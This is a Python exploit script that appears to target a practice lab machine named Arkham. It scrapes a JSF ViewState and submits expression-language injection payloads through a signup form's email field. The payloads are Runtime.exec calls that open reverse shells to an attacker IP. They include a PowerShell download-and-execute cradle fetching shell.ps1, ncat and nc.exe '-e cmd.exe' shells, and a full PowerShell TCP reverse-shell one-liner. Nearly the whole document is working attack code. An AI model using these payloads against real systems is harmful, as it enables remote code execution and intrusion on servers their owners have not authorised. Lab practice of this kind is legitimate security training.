#!/usr/bin/env python3

import requests
import re
import urllib.parse

TARGET = "http://10.129.228.116:8080/userSubscribe.faces"
ATTACKER_IP = "10.10.16.187"
ATTACKER_PORT = "4444"

# Disable SSL warnings
import urllib3
urllib3.disable_warnings()

session = requests.Session()
session.verify = False

print("=" * 70)
print("WINDOWS JSF RCE - ARKHAM")
print("=" * 70)
print(f"[*] Target: {TARGET}")
print(f"[*] Attacker: {ATTACKER_IP}:{ATTACKER_PORT}")
print()

# Step 1: Get real ViewState
print("[STEP 1] Fetching real ViewState...")
try:
    r = session.get(TARGET, timeout=10)
    
    # Extract ViewState
    vs_match = re.search(r'value="([a-zA-Z0-9+/=]+)"\s*/>', r.text)
    
    if vs_match:
        real_viewstate = vs_match.group(1)
        print(f"[+] ViewState: {real_viewstate[:50]}...")
    else:
        print("[-] Could not extract ViewState!")
        exit(1)
        
except Exception as e:
    print(f"[-] Error: {e}")
    exit(1)

# Step 2: Windows Payloads
print("\n[STEP 2] Preparing Windows RCE payloads...")

# Windows payloads (in order of preference)
payloads = [
    # Method 1: PowerShell reverse shell (BEST FOR WINDOWS)
    {
        "name": "PowerShell Reverse Shell",
        "payload": f'${{Runtime.getRuntime().exec(new String[]{{\"powershell.exe\",\"-c\",\"IEX(New-Object Net.WebClient).DownloadString(\\'http://{ATTACKER_IP}:8000/shell.ps1\\')\"}})}}'
    },
    
    # Method 2: cmd.exe reverse shell  
    {
        "name": "CMD Reverse Shell (ncat)",
        "payload": f'${{Runtime.getRuntime().exec(new String[]{{\"cmd.exe\",\"/c\",\"ncat {ATTACKER_IP} {ATTACKER_PORT} -e cmd.exe\"}})}}'
    },
    
    # Method 3: PowerShell one-liner (direct)
    {
        "name": "PowerShell Direct",
        "payload": f'${{Runtime.getRuntime().exec(new String[]{{\"powershell.exe\",\"-NoP\",\"-NonI\",\"-W\",\"Hidden\",\"-Exec\",\"Bypass\",\"-Command\",\"$$client = New-Object System.Net.Sockets.TCPClient(\\'{ATTACKER_IP}\\',{ATTACKER_PORT});$$stream = $$client.GetStream();[byte[]]$$buffer = 0..65535|%{{0}};while(($$i = $$stream.Read($$buffer, 0, $$buffer.Length)) -ne 0){{$$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($$buffer,0, $$i);$$sendback = (iex $$data 2>&1 | Out-String );$$sendback2 = $$sendback + \\\"PS \\\" + (pwd).Path + \\\">\\\";$$sendbyte = ([text.encoding]::ASCII).GetBytes($$sendback2);$$stream.Write($$sendbyte,0,$$sendbyte.Length);$$stream.Flush()}};$$client.Close()\"}})}}'
    },
    
    # Method 4: Windows netcat
    {
        "name": "Windows netcat",
        "payload": f'${{Runtime.getRuntime().exec(new String[]{{\"nc.exe\",\"{ATTACKER_IP}\",\"{ATTACKER_PORT}\",\"-e\",\"cmd.exe\"}})}}'
    },
    
    # Method 5: Simple cmd.exe test
    {
        "name": "CMD Test (whoami)",
        "payload": '$${Runtime.getRuntime().exec(new String[]{"cmd.exe","/c","whoami > C:\\\\temp\\\\whoami.txt"})}'
    },
]

# Step 3: Send payloads
print(f"\n[STEP 3] Sending {len(payloads)} different payloads...\n")

for i, payload_info in enumerate(payloads, 1):
    name = payload_info["name"]
    payload = payload_info["payload"]
    
    print(f"[{i}] Trying: {name}")
    
    data = {
        "j_id_jsp_1623871077_1:email": payload,
        "j_id_jsp_1623871077_1:submit": "SIGN UP",
        "j_id_jsp_1623871077_1_SUBMIT": "1",
        "javax.faces.ViewState": real_viewstate,
    }
    
    try:
        r = session.post(TARGET, data=data, timeout=10)
        
        if r.status_code == 500:
            print(f"    [!] Server error (500) - Command executed!")
        elif r.status_code == 200:
            print(f"    [+] Status 200 - Sent successfully")
        else:
            print(f"    [*] Status {r.status_code}")
            
    except Exception as e:
        print(f"    [-] Error: {e}")

print("\n" + "=" * 70)
print("[+] All payloads sent!")
print("[*] Check your netcat listener: nc -nlvp 4444")
print()
print("[*] Expected output:")
print("    listening on [any] 4444 ...")
print("    Connection from 10.129.228.116 XXXXX received!")
print("    C:\\\\>")
print("=" * 70)
